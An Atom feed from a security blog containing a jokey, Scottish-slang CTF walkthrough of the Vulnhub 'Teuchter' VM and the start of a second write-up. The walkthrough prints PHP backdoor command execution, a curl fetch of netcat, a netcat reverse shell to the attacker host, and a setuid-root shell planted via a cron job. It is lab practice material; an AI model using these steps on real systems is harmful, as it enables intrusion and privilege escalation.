<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: writeups | Core dump overflow]]></title>
  <link href="http://chousensha.github.io/blog/categories/writeups/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2018-10-14T08:33:56-04:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Git me some Irn-Bru ye Teuchter!]]></title>
    <link href="http://chousensha.github.io/blog/2018/10/14/git-me-some-irn-bru-ye-teuchter/"/>
    <updated>2018-10-14T08:21:15-04:00</updated>
    <id>http://chousensha.github.io/blog/2018/10/14/git-me-some-irn-bru-ye-teuchter</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s target is called Teuchter, and yes, apparently that&rsquo;s a word. There is a theme for this machine, and this why this blog post is also..different. ye will need to hang tight to yer sanity for this one. Or drink some Irn-Bru. Ah had to look at other walkthroughs when Ah got stuck and some time was spent checking Scottish references, but it was all worth it!</p>

<p>So, what&rsquo;s a Teuchter? The Wiktionary definition is:</p>

<blockquote><p>(derogatory) A Highlander especially if Gaelic-speaking; a rural Scot in general; (in Glasgow and
surrounding areas) a Scot with a thick accent from outside west-central Scotland.</p></blockquote>

<p>Some hints from the author:</p>

<blockquote><p>This VM is designed to be a bit of a joke/troll so a translator might be useful.</p>

<p>The challenge isn&rsquo;t over with root. I&rsquo;ve done my usual flag shenanigans.</p>

<p>A bit of info security research and knowing yer target helps here.</p>

<p><a href="http://www.jackiestewart.co.uk/jokes/weegie%20windies%202000.htm">http://www.jackiestewart.co.uk/jokes/weegie%20windies%202000.htm</a></p></blockquote>

<p>And this one:</p>

<blockquote><p>Less hochmagandy and more studying is needed for this one!</p></blockquote>

<p>Ah am sure ye have questions, so:</p>

<blockquote><p>hochmagandy &ndash; Scottish a mainly jocular or literary word for sexual intercourse</p></blockquote>

<p>Isn&rsquo;t this a promising start..</p>

<!-- more -->


<p>Nothing much to start from, just a web server:</p>

<p><code>
PORT   STATE SERVICE
80/tcp open  http
|_http-title: Dinnae Pwn Ma Server... Away and Hack some bawbag else!
</code></p>

<p>On the homepage there is just a GIF and a message:</p>

<p><img class="center" src="/images/pentest/teuchter/web.jpg" title="&lsquo;homepage&rsquo; &lsquo;web page&rsquo;" ></p>

<p>Ran exiftool on the picture and found nothing. However, there are several comments in the source code:</p>

<p>```</p>

<!-- Wullie's favourite film is the Breakfast Club -->


<!-- /gallery/ /flicks/ or /telly/ Maybe Jim Kerr can help with the music...?  -->


<!-- not a lot of people know about different extensions, such as .pht for PHP -->


<p>```</p>

<p>Wullie seems to be the central character here..William? Wallace? We do have a Highlander reference above, and it fits the Scottish theme. While Ah was googling, Ah found this gem on the Urban Dictionary:</p>

<p><code>
Wullie is a very caring person who is easy to get on with,
likes all the joys of life.
Meeting and chating to people from all walks of life.
Also known to like a small shandy or two supports the best scottish team the glasgow rangers.
loves to travel and to get home to the family.
what aload of bull shit wullie
</code></p>

<p>Let&rsquo;s get back to the challenge, we have 3 potential web directories to check. In the meantime, Ah have Googled for .pht, since Ah have never seen that extension:</p>

<blockquote><p>The pht file extension is associated with the Partial Hypertext file format.</p>

<p>The pht file stores HTML page that includes a PHP script, dynamically generates HTML, often by
accessing database information.</p>

<p>PHT seems to be very little used format.</p>

<p>Mime types:
application/x-httpd-php
text/html</p></blockquote>

<p>Back to the web server, /gallery/ is full of pictures, and the title is Dirty Foties..which Ah think stands for dirty feet. Because ye walk a lot..(someone needs some Irn-Bru)</p>

<p><img class="center" src="/images/pentest/teuchter/gallery.png" title="&lsquo;dirty foties&rsquo; &lsquo;gallery&rsquo;" ></p>

<p>There are more hints in the source code:</p>

<p>```
<title>Dirty Foties</title>
<body></p>

<h1>We went on a wee sojourn aboot North Kilt Town and here's whit we saw</h1>


<!-- By now, people will be going doolally. Images will open doors once ye -->


<!-- pick up on the nuances whar's ma glass cheque! -->


<p><b></b>
Here&rsquo;s something else made from Girders:</p>

<p><img src="bandit_country.jpg" alt="Andrew Carnegie" height="460" width="968"></p>

<br></br>




<!-- Beware of the milk snatcher -->


<p><b></b>
Here&rsquo;s where the girders used to come from:
<img src="milk_snatcher.jpg" alt="Margaret Roberts" height="409" width="615" align="centre"></p>

<br></br>


<p><b></b>
Wee hoose on the corner:
<img src="embra.jpg" alt="Castle" height="409" width="615" align="centre"></p>

<br></br>




<!-- The video gives triggers to the gallery -->




<!-- Definatly need to find that coded message -->


<p><b></b>
<img src="bigwheel.jpg" alt="Rotating Station" height="460" width="968" align="centre"></p>

<br></br>


<p><b></b>
Then we bumped into Mr Corleone:
<img src="horse_heid.jpg" alt="Kelpies" height="409" width="615" align="centre">
```</p>

<p>North Kilttown is a Scottish town from The Simpsons. Ah searched for the word doolally, even though Ah got the gist from the context. From Wikipedia:</p>

<blockquote><p>&ldquo;Doolally&rdquo;, originally &ldquo;doolally tap&rdquo;, meaning to &lsquo;lose oneâ€²s mind&rsquo;, derived from the boredom felt
at the Deolali British Army transit camp.</p></blockquote>

<p>The Urban Dictionary has another priceless definition for a glass cheque:</p>

<blockquote><p>A Glaswegian term: Describes a special glass bottle, containing Irn-Bru, or other similar soft
drink, available in many cornershops in Scotland. The bottle is returnable and currently attracts a
25p refund when ye give the bottle back to the shop. Called a cheque as they are often collected
and cashed (like a cheque)by students and cheap bastards alike either to buy more Bru, or with
enough bottles, some skag.</p></blockquote>

<p>If ye&rsquo;re not curious about what something called Irn-Bru is, ye&rsquo;re a bawheid!</p>

<blockquote><p>The ultimate hangover cure. Tastes best when consumed directly from a 750ml glass bottle.</p>

<p>Another one of Scotland&rsquo;s many national identities.</p>

<p>Scotland is the only country in the world that produces a soft drink that outsells Coca Cola.</p></blockquote>

<p>Ah must try some Irn-Bru! By the way, if ye were wondering, the &ldquo;Wee hoose on the corner&rdquo; is nothing spectacular&hellip;only the Edinburgh Castle! The Kelpies are 30-metre-high horse-head sculptures featuring kelpies&hellip;so what are kelpies? +1 to mythology skill:</p>

<blockquote><p>Kelpie, or water kelpie, is the Scots name given to a shape-shifting water spirit inhabiting the
lochs and pools of Scotland. It has usually been described as appearing as a horse, but is able to
adopt human form</p></blockquote>

<p>How did Ah get in this spiral? Ah had a box to hack..ye know what would help me focus? It starts with Irn and ends with Bru!</p>

<p>The /flicks/ directory gives a 403 Forbidden error, but also discloses the web server version, which is Apache/2.4.18 (Ubuntu) Server</p>

<p>The /telly/ directory also has a picture and 2 videos, along with more hints:</p>

<p>```
<title>STV Embra</title>
<body></p>

<h1>Here's some telly programs fur ye!</h1>


<!-- Mind the hidden messages -->


<p><b></b>
<img src="STV.jpg" alt="STV" height=300" width="400"></p>

<br></br>


<p>Now for some adverts&hellip;.</p>

<br></br>


<!-- noise up those crazy yanks 1st hint to a password -->


<p><video height="300" width="400" controls>
<source src="girders.ogv" type="video/ogg">
</video></p>

<!-- next hint, see how many people make the connection  -->


<!-- between A.G. Barr and the gallery... Aled Jones eh? -->


<p><video height="300" width="400" controls>
<source src="aled.ogv" type="video/ogg">
</video></p>

<br></br>




<!-- Third video gives triggers to the flicks phpinfo -->


<p>By the way, it&rsquo;s only aboot 250 weeks ti Christmas!</p>

<br></br>


<p>```</p>

<p>In case ye forgot about Irn-Bru, here&rsquo;s a reminder:</p>

<blockquote><p>A.G. BARR p.l.c., commonly known as Barr&rsquo;s, is a Scottish soft drink manufacturer, based in
Cumbernauld, Scotland. It manufactures the popular Scottish drink, Irn-Bru</p></blockquote>

<p>Back to the challenge&hellip;but it would be easier if Ah had some Irn-Bru! At this point, the only actionable hint Ah could understand was the one about phpinfo. There is no third video on the page, so Ah just tried navigating to <a href="http://192.168.145.131/flicks/phpinfo.php,">http://192.168.145.131/flicks/phpinfo.php,</a> which didn&rsquo;t work. Following on the hint about .pht extensions, Ah changed it to <a href="http://192.168.145.131/flicks/phpinfo.pht">http://192.168.145.131/flicks/phpinfo.pht</a> and got a blank page instead.</p>

<p>After some Googling and drooling over Irn-Bru, Ah found a blog post about <a href="https://blog.sucuri.net/2014/02/php-backdoors-hidden-with-clever-use-of-extract-function.html">PHP Backdoors: Hidden With Clever Use of Extract Function</a>. It explains about a seemingly innocuous backdoor with the code:</p>

<p><code>
@extract ($_REQUEST);
@die ($ctime($atime));
</code></p>

<blockquote><p>The extract() function imports variables into the local symbol table from an array.</p>

<p>This function uses array keys as variable names and values as variable values. For each element it
will create a variable in the current symbol table.</p></blockquote>

<p>The blog post is a very interesting read, and the applicable item is that the code is extracting content sent via GET/POST requests and creating variables that are then executed with the format <code>execute ctime with atime as argument</code></p>

<p>Following the example, running <a href="http://192.168.145.131/flicks/phpinfo.pht?ctime=system&amp;atime=whoami">http://192.168.145.131/flicks/phpinfo.pht?ctime=system&amp;atime=whoami</a> returns www-data, so we have achieved command execution! Time for an Irn-Bru break&hellip;</p>

<p>Doing very light enumeration, Ah found out that netcat is available on the target, so Ah fired up a listener and tried using netcat to serve a shell on my listener, but it didn&rsquo;t work. So Ah used Python&rsquo;s SimpleHTTPServer to transfer my netcat to the target system. Note that ye have to use URL encoding: <code><a href="http://192.168.145.131/flicks/phpinfo.pht?ctime=system&amp;atime=curl%20http%3A%2F%2F192.168.145.129%2Fnc%20--output%20nc">http://192.168.145.131/flicks/phpinfo.pht?ctime=system&amp;atime=curl%20http%3A%2F%2F192.168.145.129%2Fnc%20--output%20nc</a></code></p>

<p>The binary was downloaded to <code>/var/www/html/flicks</code>. Ah made it executable and ran it, but nothing happened. Next, Ah moved it to /tmp and ran it from there with <code>192.168.145.131/flicks/phpinfo.pht?ctime=system&amp;atime=%2Ftmp%2Fnc%20192.168.145.129%208080%20-e%20%2Fbin%2Fbash</code> and it worked:</p>

<p><code>
nc -vnlp 8080
listening on [any] 8080 ...
connect to [192.168.145.129] from (UNKNOWN) [192.168.145.131] 49172
whoami
www-data
</code></p>

<p>We have a reverse shell, but it&rsquo;s very limited. The usual Python shell spawning didn&rsquo;t work, because on the box there&rsquo;s actually Python 3. Which only changes things slightly: <code>python3 -c &ldquo;import pty; pty.spawn(&lsquo;/bin/bash&rsquo;);&rdquo;</code></p>

<p><code>
python3 -c "import pty; pty.spawn('/bin/bash');"
www-data@teuchter:/var/www/html/flicks$ ls /home
ls /home
cpgrogan  jkerr  proclaimers
</code></p>

<p>Inside cpgrogan there&rsquo;s a kochanski directory that we&rsquo;re not permitted to view. In jkerr&rsquo;s home there&rsquo;s an empty .sudo_as_admin_successful file, but we find a hint about jkerr&rsquo;s password:</p>

<p>```
www-data@teuchter:/home/jkerr$ cat login.txt
cat login.txt
Jim,</p>

<p>Ah decided to rename yer account to jkerr and reset the password
ye&rsquo;ll find it in the photo. Just remember the decode password
dosn&rsquo;t have a space.</p>

<p>If ye can&rsquo;t figure it out, it&rsquo;s the new name for Jonny &amp; the
Self-Abusers&hellip;
```</p>

<p>And inside proclaimers there are 2 directories. We can&rsquo;t enter 500miles, but inside letterfromamerica there are 2 interesting files belonging to root:</p>

<p><code>
www-data@teuchter:/home/proclaimers/letterfromamerica$ ls -alh
ls -alh
total 164K
drwxr-xr-x 2 proclaimers proclaimers 4.0K Aug 11  2016 .
drwxr-xr-x 5 proclaimers proclaimers 4.0K Sep 23  2016 ..
-rwsr-xr-x 1 root        root        151K Aug 11  2016 semaphore
-r-Sr-sr-t 1 root        root          42 Jul  9  2016 test
</code></p>

<p>Inside test there is some kind of message, stating that &ldquo;So Claire was right about those wildcards&rdquo;, and semaphore is an executable. Running it gives a shell under the same user account. Probably need more information (or Irn-Bru) before exploiting this.</p>

<p>Back to the next step, did a su to jkerr and used <em>breakfastclub</em> as a password and it worked! Ah used Python to transfer the images to my machine and broke my shell in the process:</p>

<p><code>
jkerr@teuchter:~$ python3 -m http.server 8080
python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 ...
192.168.145.129 - - [13/Oct/2018 18:33:23] "GET / HTTP/1.1" 200 -
192.168.145.129 - - [13/Oct/2018 18:33:23] code 404, message File not found
192.168.145.129 - - [13/Oct/2018 18:33:23] "GET /robots.txt HTTP/1.1" 404 -
192.168.145.129 - - [13/Oct/2018 18:33:24] code 404, message File not found
192.168.145.129 - - [13/Oct/2018 18:33:24] "GET /favicon.ico HTTP/1.1" 404 -
192.168.145.129 - - [13/Oct/2018 18:33:24] code 404, message File not found
192.168.145.129 - - [13/Oct/2018 18:33:24] "GET /favicon.ico HTTP/1.1" 404 -
192.168.145.129 - - [13/Oct/2018 18:33:27] "GET /promisedyeamiracle.jpg HTTP/1.1" 200 -
192.168.145.129 - - [13/Oct/2018 18:33:29] "GET /breakfastclub.jpg HTTP/1.1" 200 -
</code></p>

<p>An Irn-Bru would have prevented that mistake! After redoing the steps, Ah ran exiftool on the downloaded images and found a base64 encoded string in promisedyeamiracle.jpg:</p>

<p><code>
Copyright                       : Z2VtaW5pCg==
</code></p>

<p>Decoded, it means <em>gemini</em>. Ah didn&rsquo;t know what to do with this, so Ah googled for the other user accounts.</p>

<p>cpgrogan:</p>

<blockquote><p>Claire Patricia Grogan (born 17 March 1962), known professionally as Clare Grogan or sometimes as
C. P. Grogan, is a Scottish actress and singer. She is best known as the lead singer of the 1980s
new wave music group Altered Images and for supporting roles in the 1981 film Gregory&rsquo;s Girl and
the science fiction sitcom Red Dwarf as the first incarnation of Kristine Kochansk</p></blockquote>

<p>proclaimers:</p>

<blockquote><p>The Proclaimers are a Scottish music duo composed of twin brothers Charlie and Craig Reid (born 5
March 1962). They are best known for their songs &ldquo;I&rsquo;m Gonna Be (500 Miles)&rdquo;, &ldquo;Sunshine on Leith&rdquo;,
&ldquo;I&rsquo;m On My Way&rdquo; and &ldquo;Letter from America&rdquo;, and their singing style with a Scottish accent</p></blockquote>

<p>Well, we don&rsquo;t need an Irn-Bru to connect the dots, gemini, twins! That is actually the password for the proclaimers account. Now to get back to the folders from before:</p>

<p><code>
proclaimers@teuchter:~/500miles$ ls -alh
ls -alh
total 228K
drwx------ 2 proclaimers proclaimers 4.0K Jul  9  2016 .
drwxr-xr-x 5 proclaimers proclaimers 4.0K Sep 23  2016 ..
-rw-rw---- 1 proclaimers proclaimers 8.0K Jun 30  2016 choclate_lassie.jpg
-rw-rw---- 1 proclaimers proclaimers  97K Jun 30  2016 city_discovery.jpg
-rw-rw---- 1 proclaimers proclaimers 8.5K Jun 30  2016 night_oot_teuchters.jpg
-rw-rw---- 1 proclaimers proclaimers  87K Jun 30  2016 Restless-Natives-Scotland.jpg
-rw-rw---- 1 proclaimers proclaimers  11K Jun 30  2016 SPT_red.jpg
</code></p>

<p>Ah downloaded the images in case of need and out of curiosity. Then it was back to the semaphore. Ah grepped for files containing the word semaphore, and tried avoiding being flooded by irrelevant results like libraries. Eventually, Ah got a hit under <em>/usr/local</em>, in the <code>/usr/local/bin/numpties.sh</code> file:</p>

<p>```</p>

<h1>!/bin/sh</h1>

<h2>Right, time to sort out these numpties that put PHP shells on ma server!</h2>

<h2>Steal a copy to examine later</h2>

<p>/bin/tar czvf /root/shells.tgz /var/www/html/*.php</p>

<h2>Aww they dobbers with primative Egpytian Encryption can away and raffle themselves</h2>

<p>sudo apt-get -y purge openssh-server sftp wget</p>

<h2>Delete the shells to annoy the eejits</h2>

<p>/bin/rm -rf /var/www/html/*.php</p>

<h2>Plant a semaphore in to alert the monitoring system</h2>

<p>if /usr/bin/[ -f /home/proclaimers/letterfromamerica/semaphore ]
  then</p>

<pre><code>/bin/chown root.root /home/proclaimers/letterfromamerica/semaphore
/bin/chmod 4755 /home/proclaimers/letterfromamerica/semaphore
</code></pre>

<p>fi
```</p>

<p>Back to the dictionaries it is, and memory alert, Ah remembered being called a numpty once!</p>

<blockquote><p>numpty &ndash; A person who is incapable of performing the simplest of task correctly. Usual symptoms
include poor hand-eye coordination, zero common sense and the general illusion that they are
special (caused by parents referring to them as such and the numpty not fully grasping the meaning
implied).</p>

<p>Common causes are being dropped as a baby or repeated heavy blows to head in later life.</p>

<p>dobber &ndash; A Glasgow term for a dick head or in general just a stupid cunt.</p></blockquote>

<p>Now for the code, attempts to put PHP shells on the server fail because the shells get deleted. Also, a couple of file transfer utilities have been removed (the reason why Ah resorted to curl). It looks like this might be used in a cronjob. Finally, if the semaphore file exists, its owner is changed to root and the SUID bit is set. Which means, we can create a semaphore file that would allow us to become root if it were SUID.</p>

<p>On my box, Ah compiled an executable (no GCC on the target) with the following C code:</p>

<p>```</p>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;unistd.h></h1>

<p>int main(void)
{
  setuid(0); setgid(0); system(&ldquo;/bin/bash&rdquo;);
}
```</p>

<p>Ah made it executable for everyone and transfered it to the target, again with curl:</p>

<p>```
curl <a href="http://192.168.145.129/rootme">http://192.168.145.129/rootme</a> &mdash;output ./semaphore   <br/>
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</p>

<pre><code>                             Dload  Upload   Total   Spent    Left  Speed
</code></pre>

<p>100 16712  100 16712    0     0  1002k      0 &mdash;:&mdash;:&mdash; &mdash;:&mdash;:&mdash; &mdash;:&mdash;:&mdash; 1020k
```</p>

<p>Waited a while, thought about some Irn-Bru, came back and got root!</p>

<p><code>
./semaphore
root@teuchter:~/letterfromamerica#
</code></p>

<p>Finding the flag is usually the last step, but not on knightmare&rsquo;s machines!</p>

<p><code>
oot@teuchter:/root# ls -alh
ls -alh
total 1.1M
drwx------  5 root root 4.0K Nov  2  2016 .
drwxr-xr-x 23 root root 4.0K Nov  2  2016 ..
drwx------  2 root root 4.0K Nov  2  2016 .aptitude
-rw-r--r--  1 root root 3.1K Oct 22  2015 .bashrc
drwx------  2 root root 4.0K Nov  2  2016 .cache
-rw-r--r--  1 root root 1.1M Jul  9  2016 flag.jpg
-rw-r--r--  1 root root  108 Sep 23  2016 flag.txt
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  3 root root 4.0K Aug  1  2016 re-record-not-fade-away
-rw-r--r--  1 root root   75 Jul  9  2016 .selected_editor
-rw-r--r--  1 root root   45 Oct 13 20:00 shells.tgz
-rw-------  1 root root 3.4K Nov  2  2016 .viminfo
</code></p>

<p>Ah transfered the flag.jpg to my machine with netcat, but no metadata that could help. The text file is not the right one, obviously:</p>

<p>```
root@teuchter:/root# cat flag.txt
cat flag.txt
Ah say! Ah say! Ah say boy! Y'all interested in hochmagandy again&hellip;?</p>

<p>Y'all know this aint the correct flag!
```</p>

<p>Looking around further:</p>

<p><code>
root@teuchter:/root/re-record-not-fade-away# ls
ls
FeelsLikeHeaven  on
cat FeelsLikeHeaven
Yer pure no gonna find the flag... A pit it in a bottle of Red Kola
</code></p>

<p>The directory tree goes&hellip;on..and on&hellip;Ah used a Python script to solve this annoyance:</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">os</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">startdir</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">.&amp;</span><span class="n">rsquo</span><span class="p">;</span>
</span><span class='line'><span class="k">for</span> <span class="nb">dir</span><span class="p">,</span> <span class="n">subdir</span><span class="p">,</span> <span class="n">files</span> <span class="ow">in</span> <span class="n">os</span><span class="o">.</span><span class="n">walk</span><span class="p">(</span><span class="n">startdir</span><span class="p">):</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="k">print</span><span class="p">(</span><span class="s">&#39;Found directory: </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="nb">dir</span><span class="p">)</span>
</span><span class='line'><span class="k">for</span> <span class="n">f</span> <span class="ow">in</span> <span class="n">files</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\t</span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">f</span><span class="p">)</span>
</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>```
root@teuchter:/root/re-record-not-fade-away# python3 dir.py
python3 dir.py
Found directory: .</p>

<pre><code>FeelsLikeHeaven
dir.py
</code></pre>

<p>Found directory: ./on
Found directory: ./on/and
Found directory: ./on/and/on
Found directory: ./on/and/on/and
Found directory: ./on/and/on/and/on
Found directory: ./on/and/on/and/on/and
Found directory: ./on/and/on/and/on/and/on
Found directory: ./on/and/on/and/on/and/on/and
Found directory: ./on/and/on/and/on/and/on/and/on
Found directory: ./on/and/on/and/on/and/on/and/on/and
Found directory: ./on/and/on/and/on/and/on/and/on/and/ariston</p>

<pre><code>TeuchterESX.zip
</code></pre>

<p>```</p>

<p>Inside this madness there&rsquo;s a 12M archive. Ah moved it to a sane location, transfered it to my machine, and attempted to extract it, but it was password protected. No need for cracking, guessing from all the options, the password is <em>Teuchter</em>:</p>

<p><code>
unzip TeuchterESX.zip
Archive:  TeuchterESX.zip
[TeuchterESX.zip] TeuchterESX.vmdk password:
  inflating: TeuchterESX.vmdk        
</code></p>

<p>A VMDK disk. There&rsquo;s actually a hint for this inside root&rsquo;s crontab entries:</p>

<p>```</p>

<h2>So vmfs-tools package eh&hellip;.?</h2>

<p>*/5 * * * * /bin/sh /usr/local/bin/numpties.sh > /dev/null 2>&amp;1
```</p>

<p>Let&rsquo;s see what the package does:</p>

<p><code>
apt-cache show vmfs-tools
Package: vmfs-tools
Source: vmfs-tools (0.2.5-1)
Version: 0.2.5-1+b2
Installed-Size: 256
Maintainer: Mike Hommey &lt;glandium@debian.org&gt;
Architecture: amd64
Depends: libc6 (&gt;= 2.14), libfuse2 (&gt;= 2.6), libuuid1 (&gt;= 2.16)
Size: 53964
SHA256: 39379758d08827726308ea6ccf76de0cc403ba94d1bcdec9127a120bbf4b050a
SHA1: 7db639825b49cabb9d9081dd22ca94813cf335b6
MD5sum: ee9aa037a69d28f6db694632d0f7a106
Description: Tools to access VMFS filesystems
 VMFS is a clustered filesystem designed to store virtual machine disks for
 VMware ESX or ESXi Server hosts. This set of tools allows to access these
 filesystems from some other non ESX/ESXi host for e.g. maintenance tasks.
 .
 Only read access is available at the moment, but write access is under
 works. Multiple extents are supported.
 .
 The VMFS can be accessed with a command line tool or mounted through a
 userspace filesystem (FUSE-based).
Description-md5: 0cdea504f6c5a9da0070eeda2f011352
Tag: admin::filesystem, admin::kernel, admin::virtualization,
 implemented-in::c, role::program
Section: otherosfs
Priority: extra
Filename: pool/main/v/vmfs-tools/vmfs-tools_0.2.5-1+b2_amd64.deb
</code></p>

<p>Ah installed the package, and then hit a standstill on how to actually mount the virtual disk. After trying several approaches and failing, what worked was attaching the VMDK to my Kali virtual machine from the host. Ah had to change the compatibility of my VM for that to work, but it could possibly also work by editing the VMDK and changing <em>ddb.virtualHWVersion</em> to a version matching the VM&rsquo;s compatibility, but Ah haven&rsquo;t tried that. After doing it like that, Ah was able to see the disk under <em>/dev/sdb1</em>:</p>

<p>```
fdisk -l
Disk /dev/sdb: 2 GiB, 2147483648 bytes, 4194304 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: gpt
Disk identifier: AD5D7662-CD00-4621-AF02-68A05AD0A688</p>

<p>Device     Start     End Sectors Size Type
/dev/sdb1   2048 4194270 4192223   2G VMware VMFS</p>

<p>Disk /dev/sda: 40 GiB, 42949672960 bytes, 83886080 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0xa89dd27d</p>

<p>Device     Boot    Start      End  Sectors Size Id Type
/dev/sda1  *        2048 79693823 79691776  38G 83 Linux
/dev/sda2       79695870 83884031  4188162   2G  5 Extended
/dev/sda5       79695872 83884031  4188160   2G 82 Linux swap / Solaris
```</p>

<p>Now Ah could mount it and see what&rsquo;s inside:</p>

<p><code>
root@kali:~# vmfs-fuse /dev/sdb1 /mnt/vmdk
root@kali:~# ls /mnt/vmdk
hint.txt  redkola
</code></p>

<p>The hint mentions a password made of 25 characters that we should be able to find from what we&rsquo;ve been through:</p>

<p>```
cat hint.txt
Almost there.. Check the ISO and remember password relates to the TV Advert ye watched.</p>

<p>Ah took out the spaces but it&rsquo;s 25 characters but the Wikipedia page will get it for ye.
```</p>

<p>In the redkola (Irn-Bru, anyone?) folder there are more VMDK files, but at least the hint focuses us on the ISO:</p>

<p><code>
oot@kali:/mnt/vmdk/redkola# ls
redkola_1-flat.vmdk  redkola.iso    redkola.vmsd
redkola_1.vmdk       redkola.nvram  redkola.vmx
</code></p>

<p>Ah mounted the ISO next:</p>

<p><code>
mount -o loop,ro redkola.iso /mnt/redkola
root@kali:/mnt/redkola# ls
glass_ch.jpg
</code></p>

<p><img class="center" src="/images/pentest/teuchter/glass_ch.jpg" title="&lsquo;glass cheque&rsquo; &lsquo;irn-bru!!!!!!&rsquo;" ></p>

<p>All that Irn-Bru! And with something extra, perhaps? Enter steghide!</p>

<h4>steghide</h4>

<blockquote><p>Steghide  is a steganography program that is able to hide data in various kinds of
image- and audio-files. The color- respectivly sample-frequencies  are  not  changed thus making
the embedding resistant against first-order statistical tests.</p>

<p>Features include the compression of the embedded  data,  encryption  of
the  embedded  data  and automatic integrity checking using a checksum.
The JPEG, BMP, WAV and AU file formats are supported for use  as  cover
file. There are no restrictions on the format of the secret data.</p></blockquote>

<p>Steghide can also be used to check for the presence of a secret message and to extract it, if provided the correct passphrase. Putting together all the hints (scotland, girders, irn-bru wiki page) or just watching and listening to the advert gives us the passphrase <code>madeinscotlandfromgirders</code></p>

<p>```
steghide info glass_ch.jpg
&ldquo;glass_ch.jpg&rdquo;:
  format: jpeg
  capacity: 3.9 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase:
  embedded file &ldquo;realflag.txt&rdquo;:</p>

<pre><code>size: 972.0 Byte
encrypted: rijndael-128, cbc
compressed: yes
</code></pre>

<p>```</p>

<p>Aaand, after much pain, we have the flag!</p>

<p><code>
steghide extract -sf glass_ch.jpg
Enter passphrase:
wrote extracted data to "realflag.txt".
</code></p>

<p>Achievement unlocked: Unlimited Irn-Bru!</p>

<p>```
cat realflag.txt</p>

<p>Gaun Yersel Big Man! B-)</p>

<p>Congratulations for the fifth time on capturing this flag!</p>

<p>Yes, I know this VM has really got on your nerves, and that was the main
point&hellip;</p>

<p>I decided to have some fun with you, and hopefully you have learned some
new ways to look at things. You know, all this could have been avoided
if Siri just leanred what &ldquo;outwith&rdquo; means, I wouldn&rsquo;t have to build this
VM. I&rsquo;m trolling you again of course!</p>

<p>I hope this VM was fun for you, and I&rsquo;m sure you can now insult people
in another language :&ndash;)</p>

<p>Thanks to mrb3n who shared a joke with me and pushing me to set up a VM
for trolling everyone.</p>

<p>Shout-outs yet again to #vulnhub for hosting a great learning tool and
being a great inspiration to make these VMs. A special thanks goes to
mrb3n, cmaddy and GKNSB for repeated testing. Many thanks to g0tM1lk
for providing some valuable feedback and offering to host my CTF again.</p>

<pre><code>                                                       --Knightmare
</code></pre>

<p>```</p>

<p>This challenge cost me 1.5 days of the weekend, but it was funny as feck! And Ah learned a couple slang words that will sure come in handy. AND IRN-BRU!!! Which, in case ye haven&rsquo;t figured it out, stands for Iron Brew! Cheers, knightmare!</p>

<p>Just gonna leave this here:</p>

<p><img class="center" src="/images/pentest/teuchter/irn-bru.jpg" title="&lsquo;irn-bru&rsquo; &lsquo;iron brew effect&rsquo;" ></p>

<p>And this:</p>

<ul>
<li><a href="https://foodanddrink.scotsman.com/drink/15-facts-about-irn-bru/">https://foodanddrink.scotsman.com/drink/15-facts-about-irn-bru/</a></li>
</ul>


<p>It&rsquo;s not over:</p>

<p>```</p>

<hr />

<p>/ When I&rsquo;m a burger, Ah want to be washed \
\ down with Irn-Bru                      /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hack the IMF]]></title>
    <link href="http://chousensha.github.io/blog/2018/10/06/hack-the-imf/"/>
    <updated>2018-10-06T02:45:42-04:00</updated>
    <id>http://chousensha.github.io/blog/2018/10/06/hack-the-imf</id>
    <content type="html"><![CDATA[<p>The VM description states that IMF is a intelligence agency that you must hack to get all flags and ultimately root. The flags start off easy and get harder as you progress. Each flag contains a hint to the next flag.</p>

<p>The difficulty is Beginner/Moderate</p>

<!-- more -->


<p><code>
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: IMF - Homepage
</code></p>

